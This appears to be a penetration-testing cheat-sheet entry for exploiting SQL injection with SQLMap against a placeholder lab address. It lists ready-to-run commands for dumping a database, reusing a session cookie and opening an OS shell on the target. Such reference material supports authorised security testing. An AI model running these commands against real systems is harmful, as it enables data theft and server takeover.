---
description: |
  Detect and exploit SQL injection vulnerabilities using SQLMap.

  Reference values:
    Target URL: http://10.10.10.1/page?id=1
command: |
  # Basic test
  sqlmap -u "http://10.10.10.1/page?id=1" --batch

  # Dump database
  sqlmap -u "http://10.10.10.1/page?id=1" --batch --dump

  # With cookie authentication
  sqlmap -u "http://10.10.10.1/page?id=1" --cookie="PHPSESSID=abc123" --batch --dump

  # OS shell
  sqlmap -u "http://10.10.10.1/page?id=1" --batch --os-shell
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
ports:
  - "80"
  - "443"
  - "8080"
items:
  - No_Creds
techniques:
  - SQLi
network_position:
  - External
  - Internal
references:
  - https://github.com/sqlmapproject/sqlmap
---
